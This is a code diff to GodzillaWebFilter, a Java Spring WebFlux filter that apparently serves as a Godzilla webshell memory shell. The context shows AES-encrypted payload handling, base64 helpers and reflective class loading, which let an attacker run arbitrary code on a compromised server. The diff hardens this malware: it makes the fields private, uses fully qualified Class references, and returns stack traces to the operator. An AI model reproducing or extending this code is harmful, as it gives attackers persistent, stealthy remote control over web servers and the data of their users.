@@ -11,6 +11,7 @@ import reactor.core.publisher.Mono;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.ByteArrayOutputStream;
+import java.io.PrintStream;
 import java.nio.charset.StandardCharsets;
 
 /**
@@ -18,12 +19,12 @@ import java.nio.charset.StandardCharsets;
  * @since 2024/12/25
  */
 public class GodzillaWebFilter extends ClassLoader implements WebFilter {
-    public static String key;
-    public static String pass;
-    public static String md5;
-    public static String headerName;
-    public static String headerValue;
-    public Class<?> payload;
+    private static String key;
+    private static String pass;
+    private static String md5;
+    private static String headerName;
+    private static String headerValue;
+    private static Class<?> payload;
 
     public GodzillaWebFilter() {
     }
@@ -63,6 +64,7 @@ public class GodzillaWebFilter extends ClassLoader implements WebFilter {
                 }
             } catch (Throwable e) {
                 e.printStackTrace();
+                result.append(getErrorMessage(e));
             }
             return Mono.just(new DefaultDataBufferFactory().wrap(result.toString().getBytes(StandardCharsets.UTF_8)));
         });
@@ -71,10 +73,10 @@ public class GodzillaWebFilter extends ClassLoader implements WebFilter {
     @SuppressWarnings("all")
     public static String base64Encode(byte[] bs) throws Exception {
         try {
-            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
+            Object encoder = java.lang.Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
             return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
         } catch (Exception var6) {
-            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
+            Object encoder = java.lang.Class.forName("sun.misc.BASE64Encoder").newInstance();
             return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
         }
     }
@@ -82,10 +84,10 @@ public class GodzillaWebFilter extends ClassLoader implements WebFilter {
     @SuppressWarnings("all")
     public static byte[] base64Decode(String bs) throws Exception {
         try {
-            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
+            Object decoder = java.lang.Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
             return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
+            Object decoder = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance();
             return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
     }
@@ -94,5 +96,20 @@ public class GodzillaWebFilter extends ClassLoader implements WebFilter {
         Cipher c = Cipher.getInstance("AES");
         c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
         return c.doFinal(s);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 }
